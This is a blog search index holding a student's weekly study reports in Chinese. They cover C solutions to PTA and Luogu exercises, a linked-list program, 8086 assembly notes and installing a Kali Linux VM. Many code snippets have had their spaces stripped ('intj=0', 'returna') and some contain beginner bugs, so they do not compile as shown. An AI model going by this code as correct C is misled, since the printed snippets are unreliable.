<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2019.11.25-2019.11.30</title>
    <url>/32145.html</url>
    <content><![CDATA[<h2 id="1-PTA-寻找完美数"><a href="#1-PTA-寻找完美数" class="headerlink" title="1.PTA-寻找完美数"></a>1.PTA-寻找完美数</h2><p><img src="https://img-blog.csdnimg.cn/20191129134009445.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="题目如图"><br><a id="more"></a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge</span><span class="params">(inti)</span></span>&#123;</span><br><span class="line">	intj=<span class="number">0</span>;</span><br><span class="line">	intn=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(intk=<span class="number">2</span>;k&lt;i;k++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i%k==<span class="number">0</span>)&#123;</span><br><span class="line">			j++;</span><br><span class="line">			n=n+k;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	inta=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(n==i&amp;&amp;i!=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d"</span>,i);</span><br><span class="line">		a=<span class="number">1</span>;</span><br><span class="line">		returna;</span><br><span class="line">	&#125;</span><br><span class="line">	return0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	inta,b;</span><br><span class="line">	intj=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;a,&amp;b);</span><br><span class="line">	<span class="keyword">for</span>(inti=a;i&lt;=b;i++)&#123;</span><br><span class="line">		j=judge(i);</span><br><span class="line">		<span class="keyword">if</span>(j==<span class="number">1</span>)&#123;</span><br><span class="line">			c=<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(c!=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"None"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是第一次提交的，结果只对了一个，其他都是格式错误，感觉应该是结尾不能有空格，就将 main 函数里的参数 c 传入 judge 函数，判断输出的是否是第一个完美数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge</span><span class="params">(inti,intc)</span></span>&#123;</span><br><span class="line">	intj=<span class="number">0</span>;</span><br><span class="line">	intn=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(intk=<span class="number">2</span>;k&lt;i;k++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i%k==<span class="number">0</span>)&#123;</span><br><span class="line">			j++;</span><br><span class="line">			n=n+k+i/k;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	inta=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(n==i&amp;&amp;i!=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(c==<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d"</span>,i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d"</span>,i);</span><br><span class="line">		&#125;</span><br><span class="line">		a=<span class="number">1</span>;</span><br><span class="line">		returna;</span><br><span class="line">	&#125;</span><br><span class="line">	return0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第二次提交的时候有一个测试点没有通过，猜测是 i 太大的时候超时了，于是把 judge 函数里循环的循环条件改为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">k&lt;<span class="built_in">sqrt</span>(i)</span><br></pre></td></tr></table></figure>
<p>就通过了。</p>
<h2 id="2-PTA-验证“哥德巴赫猜想”"><a href="#2-PTA-验证“哥德巴赫猜想”" class="headerlink" title="2.PTA-验证“哥德巴赫猜想”"></a>2.PTA-验证“哥德巴赫猜想”</h2><p><img src="https://img-blog.csdnimg.cn/20191129234420522.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line">intprime(intq)&#123;</span><br><span class="line">	inti=<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">for</span>(;i&lt;q;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(q%i==<span class="number">0</span>)&#123;</span><br><span class="line">			return0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(q==i)&#123;</span><br><span class="line">		return1;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">intmain()&#123;</span><br><span class="line">	intn;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">	intm;</span><br><span class="line">	m=<span class="built_in">sqrt</span>(n)+<span class="number">1</span>;</span><br><span class="line">	inta;</span><br><span class="line">	intta1;</span><br><span class="line">	intta2;</span><br><span class="line">	<span class="keyword">for</span>(intp=<span class="number">2</span>;p&lt;n/<span class="number">2</span>;p++)&#123;</span><br><span class="line">		ta1=<span class="number">0</span>;</span><br><span class="line">		ta2=<span class="number">0</span>;</span><br><span class="line">		a=n-p;</span><br><span class="line">		<span class="keyword">if</span>(prime(p)==<span class="number">0</span>)	<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">if</span>(prime(a)==<span class="number">0</span>)	<span class="keyword">continue</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d=%d+%d"</span>,n,p,a);</span><br><span class="line">		return0;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一次提交的时候长这样，依旧是最大 N 的时候运行超时，想了好久不知道怎么改，上网搜了一下：<a href="https://blog.csdn.net/solitarily/article/details/78557649" target="_blank" rel="noopener">7-6 验证“哥德巴赫猜想”（20 分）</a>得到：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prime</span><span class="params">(intn)</span></span>&#123;</span><br><span class="line"><span class="comment">//判断n为偶数时</span></span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">2</span>)&#123;</span><br><span class="line">		return1;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(n&lt;<span class="number">2</span>||n%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">		return0;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//判断n为奇数时</span></span><br><span class="line">	<span class="keyword">for</span>(inti=<span class="number">3</span>;i*i&lt;=n;i=i+<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(n%i==<span class="number">0</span>)&#123;</span><br><span class="line">			return0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	intn;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">4</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"4=2+2"</span>);</span><br><span class="line">		return0;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(inti=<span class="number">2</span>;i&lt;n/<span class="number">2</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(prime(i)&amp;&amp;prime(n-i))&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d=%d+%d"</span>,n,i,n-i);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-洛谷-P2089-烤鸡"><a href="#3-洛谷-P2089-烤鸡" class="headerlink" title="3.洛谷-P2089 烤鸡"></a>3.洛谷-P2089 烤鸡</h2><p><img src="https://img-blog.csdnimg.cn/201911300913530.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>只想到了这个方法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">intmain()&#123;</span><br><span class="line">	intn;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">	<span class="keyword">if</span>(n&gt;<span class="number">30</span>||n&lt;<span class="number">10</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"0"</span>);</span><br><span class="line">		return0;</span><br><span class="line">	&#125;</span><br><span class="line">	intcnt=<span class="number">0</span>;</span><br><span class="line">	inta,b,c,d,e,f,g,h,i,j;</span><br><span class="line">	<span class="keyword">for</span>(a=<span class="number">1</span>;a&lt;=<span class="number">3</span>;a++)</span><br><span class="line">		<span class="keyword">for</span>(b=<span class="number">1</span>;b&lt;=<span class="number">3</span>;b++)</span><br><span class="line">			<span class="keyword">for</span>(c=<span class="number">1</span>;c&lt;=<span class="number">3</span>;c++)</span><br><span class="line">				<span class="keyword">for</span>(d=<span class="number">1</span>;d&lt;=<span class="number">3</span>;d++)</span><br><span class="line">					<span class="keyword">for</span>(e=<span class="number">1</span>;e&lt;=<span class="number">3</span>;e++)</span><br><span class="line">						<span class="keyword">for</span>(f=<span class="number">1</span>;f&lt;=<span class="number">3</span>;f++)</span><br><span class="line">							<span class="keyword">for</span>(g=<span class="number">1</span>;g&lt;=<span class="number">3</span>;g++)</span><br><span class="line">								<span class="keyword">for</span>(h=<span class="number">1</span>;h&lt;=<span class="number">3</span>;h++)</span><br><span class="line">									<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">3</span>;i++)</span><br><span class="line">										<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=<span class="number">3</span>;j++)</span><br><span class="line">											<span class="keyword">if</span>(a+b+c+d+e+f+g+h+i+j==n)</span><br><span class="line">												cnt++;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,cnt);</span><br><span class="line">	<span class="keyword">for</span>(a=<span class="number">1</span>;a&lt;=<span class="number">3</span>;a++)</span><br><span class="line">		<span class="keyword">for</span>(b=<span class="number">1</span>;b&lt;=<span class="number">3</span>;b++)</span><br><span class="line">			<span class="keyword">for</span>(c=<span class="number">1</span>;c&lt;=<span class="number">3</span>;c++)</span><br><span class="line">				<span class="keyword">for</span>(d=<span class="number">1</span>;d&lt;=<span class="number">3</span>;d++)</span><br><span class="line">					<span class="keyword">for</span>(e=<span class="number">1</span>;e&lt;=<span class="number">3</span>;e++)</span><br><span class="line">						<span class="keyword">for</span>(f=<span class="number">1</span>;f&lt;=<span class="number">3</span>;f++)</span><br><span class="line">							<span class="keyword">for</span>(g=<span class="number">1</span>;g&lt;=<span class="number">3</span>;g++)</span><br><span class="line">								<span class="keyword">for</span>(h=<span class="number">1</span>;h&lt;=<span class="number">3</span>;h++)</span><br><span class="line">									<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">3</span>;i++)</span><br><span class="line">										<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=<span class="number">3</span>;j++)</span><br><span class="line">											<span class="keyword">if</span>(a+b+c+d+e+f+g+h+i+j==n)</span><br><span class="line">												<span class="built_in">printf</span>(<span class="string">"%d%d%d%d%d%d%d%d%d%d\n"</span>,a,b,c,d,e,f,g,h,i,j);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>虽然通过了但是觉得这样太傻了<br>不过别人交的题解也没看懂….<br>感觉这个方法挺特别的：<br><img src="https://img-blog.csdnimg.cn/20191130094135480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="4-链表"><a href="#4-链表" class="headerlink" title="4.链表"></a>4.链表</h2><p>周二在 b 站上看了个讲解单链表的教程：<a href="https://www.bilibili.com/video/av418203?from=search&amp;seid=9482584295121953132" target="_blank" rel="noopener">C 语言入门教程第 13 讲动态内存分配和链表</a>，跟着打了两遍，看代码理解了一遍，感觉还不是很懂，就尝试自己打了一下。<br>然后顺便把教程里没说的删除弄出来了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">structstud&#123;</span><br><span class="line">	charname[<span class="number">10</span>];</span><br><span class="line">	structstud*next;</span><br><span class="line">&#125;;</span><br><span class="line">voidprint(structstud*p);</span><br><span class="line"><span class="function">structstud*<span class="title">remove</span><span class="params">(structstud*p)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">structstud*<span class="title">build</span><span class="params">()</span></span>&#123;</span><br><span class="line">	structstud*current,*nextp,*head;</span><br><span class="line">	head=(structstud*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstud));</span><br><span class="line">	charstr[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"typeaname："</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="built_in">strcpy</span>(head-&gt;name,str);</span><br><span class="line">	current=head;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	chara;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"keepdoing?\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;a);</span><br><span class="line">	<span class="keyword">while</span>(a==<span class="string">'y'</span>)&#123;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"typeaname："</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line">		getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		nextp=(structstud*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstud));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="built_in">strcpy</span>(nextp-&gt;name,str);</span><br><span class="line">		current-&gt;next=nextp;</span><br><span class="line">		current=nextp;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"keepdoing?\n"</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;a);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	current-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	returnhead;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">structstud*<span class="title">insert</span><span class="params">(structstud*p)</span></span>&#123;</span><br><span class="line">	structstud*insert,*current;</span><br><span class="line">	intposition;</span><br><span class="line">	charstr[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"insertposition:\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;<span class="built_in">position</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"typeaname:"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line">	getchar();</span><br><span class="line"></span><br><span class="line">	current=p;</span><br><span class="line">	insert=(structstud*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstud));</span><br><span class="line">	<span class="built_in">strcpy</span>(insert-&gt;name,str);</span><br><span class="line"></span><br><span class="line">	insert-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">position</span>!=<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">while</span>(<span class="built_in">position</span>&gt;<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			current=current-&gt;next;</span><br><span class="line">			<span class="built_in">position</span>--;</span><br><span class="line">		&#125;<span class="comment">//current=insert-1;</span></span><br><span class="line">		insert-&gt;next=current-&gt;next;</span><br><span class="line">		current-&gt;next=insert;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		insert-&gt;next=current;</span><br><span class="line">		p=insert;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\npresentelement:\n"</span>);</span><br><span class="line">	<span class="built_in">print</span>(p);</span><br><span class="line">	returnp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">intmain()&#123;</span><br><span class="line">	structstud*p;</span><br><span class="line">	p=build();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"presentelement:\n"</span>);</span><br><span class="line">	<span class="built_in">print</span>(p);</span><br><span class="line"></span><br><span class="line">	charb=<span class="string">'b'</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"insert?yorn"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;b);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">while</span>(b!=<span class="string">'n'</span>)&#123;</span><br><span class="line">		p=insert(p);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"insert?yorn"</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;b);</span><br><span class="line"><span class="comment">//		getchar();</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	charc;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"deleteaname?yorn"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;c);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">while</span>(c!=<span class="string">'n'</span>)&#123;</span><br><span class="line">		p=<span class="built_in">remove</span>(p);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"deleteaname?yorn"</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;c);</span><br><span class="line">		getchar();</span><br><span class="line">	&#125;</span><br><span class="line">	return0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">voidprint(structstud*p)&#123;</span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(p-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,p-&gt;name);</span><br><span class="line">			p=p-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,p-&gt;name);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">structstud*<span class="title">remove</span><span class="params">(structstud*p)</span></span>&#123;</span><br><span class="line">	structstud*<span class="built_in">position</span>,*current=p;</span><br><span class="line">	intpo;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"place:"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;po);</span><br><span class="line">	<span class="keyword">if</span>(po!=<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">while</span>(po!=<span class="number">1</span>)&#123;</span><br><span class="line">			current=current-&gt;next;</span><br><span class="line">			po--;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">position</span>=current;</span><br><span class="line">		<span class="built_in">position</span>=<span class="built_in">position</span>-&gt;next;</span><br><span class="line">		current-&gt;next=<span class="built_in">position</span>-&gt;next;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		p=current-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(current);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"currentlist:\n"</span>);</span><br><span class="line">	<span class="built_in">print</span>(p);</span><br><span class="line">	returnp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>周报</tag>
      </tags>
  </entry>
  <entry>
    <title>2019.12.08-2019.12.14</title>
    <url>/2598.html</url>
    <content><![CDATA[<h1 id="2019-12-08-2019-12-14学习报告"><a href="#2019-12-08-2019-12-14学习报告" class="headerlink" title="2019.12.08~2019.12.14学习报告"></a>2019.12.08~2019.12.14学习报告</h1><hr>
<h2 id="1-洛谷-P1296-奶牛的耳语"><a href="#1-洛谷-P1296-奶牛的耳语" class="headerlink" title="1.洛谷-P1296 奶牛的耳语"></a>1.洛谷-P1296 奶牛的耳语</h2><p><img src="https://img-blog.csdnimg.cn/20191214140215863.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,d;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;n,&amp;d);</span><br><span class="line">	<span class="keyword">int</span> a[n];</span><br><span class="line">	<span class="keyword">int</span> g=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> temp;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(a[j]&lt;a[i])&#123;</span><br><span class="line">				temp=a[i];</span><br><span class="line">				a[i]=a[j];</span><br><span class="line">				a[j]=temp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>((a[j]-a[i])&lt;=d)&#123;</span><br><span class="line">				g++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d"</span>,g);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>结果两个测试点超时了<br>艳玲学姐说是冒泡的时间复杂度高，要用快排<br><a id="more"></a><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inc</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> * a,<span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> * (<span class="keyword">int</span> * )a-* (<span class="keyword">int</span> *)b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	qsort(a,n, <span class="keyword">sizeof</span>(<span class="keyword">int</span>),inc);</span><br></pre></td></tr></table></figure><br>了解了一下快排<br>感觉很神奇</p>
<p><a href="https://mp.weixin.qq.com/s/PQLC7qFjb74kt6PdExP8mw" target="_blank" rel="noopener">漫画：什么是快速排序？（完整版）</a></p>
<h2 id="2-汇编语言学习"><a href="#2-汇编语言学习" class="headerlink" title="2.汇编语言学习"></a>2.汇编语言学习</h2><h3 id="ds和-address"><a href="#ds和-address" class="headerlink" title="ds和[address]"></a>ds和[address]</h3><blockquote>
<p>将1000：0中的数据读到al中：</p>
<p>mov bx,1000H<br>mov ds,bx<br>mov al,[0]</p>
</blockquote>
<p>[…..]里表示的是偏移地址，执行第三条指令时cpu自动取ds中的数据作为内存单元的段地址</p>
<p>ds是段寄存器，不能用mov ds,1000H，只能用一个寄存器进行中转。</p>
<h3 id="mov-add-sub指令"><a href="#mov-add-sub指令" class="headerlink" title="mov add sub指令"></a>mov add sub指令</h3><p>mov/sub/add 寄存器，数据<br>mov/sub/add 寄存器，寄存器<br>mov/sub/add 寄存器&lt;——&gt;内存单元</p>
<p>mov 段寄存器&lt;——&gt;寄存器<br>mov 内存单元&lt;——&gt;段寄存器</p>
<p>sub和add 不能对段寄存器操作</p>
<h3 id="栈："><a href="#栈：" class="headerlink" title="栈："></a>栈：</h3><p>入栈：将一个新的元素放到栈顶<br>出栈：从栈顶取出一个元素<br>栈顶的元素总是最后入栈，需要出栈时又最先被从栈中取出</p>
<h4 id="栈机制："><a href="#栈机制：" class="headerlink" title="栈机制："></a>栈机制：</h4><p>都以字为单位进行<br>push 入栈<br>pop 出栈<br>高地址单元存放高8位，低地址单元存放低8位</p>
<p>cpu如何知道某段空间被当作栈来使用？———栈顶的段地址存放在段寄存器SS中。<br>cpu如何知道哪个单元时栈顶单元？———偏移地址存放在寄存器SP中。</p>
<p>push ax 执行时：</p>
<ol>
<li>sp=sp-2，ss：sp只想当前栈顶前面的单元，以当前栈顶前面的单元为新栈顶</li>
<li>将ax中的内容送入ss：sp指向的内存单元处</li>
</ol>
<p>栈空，ss：sp指向占空间最高地址单元的下一个单元：<br>如果将10000H~1000FH这段空间当作栈，此时ss=1000，sp=0010</p>
<h4 id="栈顶超界："><a href="#栈顶超界：" class="headerlink" title="栈顶超界："></a>栈顶超界：</h4><p>push：sp=sp-2，将栈空间外的数据覆盖<br>pop：sp=sp+2，再push后将栈空间外的数据覆盖</p>
<h4 id="push、pop指令"><a href="#push、pop指令" class="headerlink" title="push、pop指令"></a>push、pop指令</h4><ul>
<li>push：先改变sp，后向ss：sp传送</li>
<li>pop：先读取ss：sp处数据，后改变sp</li>
</ul>
<p>栈顶变化范围最大为0~FFFFH<br>栈空：sp=0<br>栈满：sp=0</p>
<p>pop后栈内数据不变化</p>
<h2 id="3-搭kali"><a href="#3-搭kali" class="headerlink" title="3.搭kali"></a>3.搭kali</h2><p>1.下载并安装VMware Workstation pro、下载Kali Linux 64-bit VMware<br>2.打开虚拟机<img src="https://img-blog.csdnimg.cn/2019121415301690.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.浏览网页的时候发现中文不能显示，就按照<a href="https://blog.csdn.net/dust_hk/article/details/103299136" target="_blank" rel="noopener">解决kali-2019.4中文乱码问题</a>解决了</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.01.12-2020.01.18</title>
    <url>/19661.html</url>
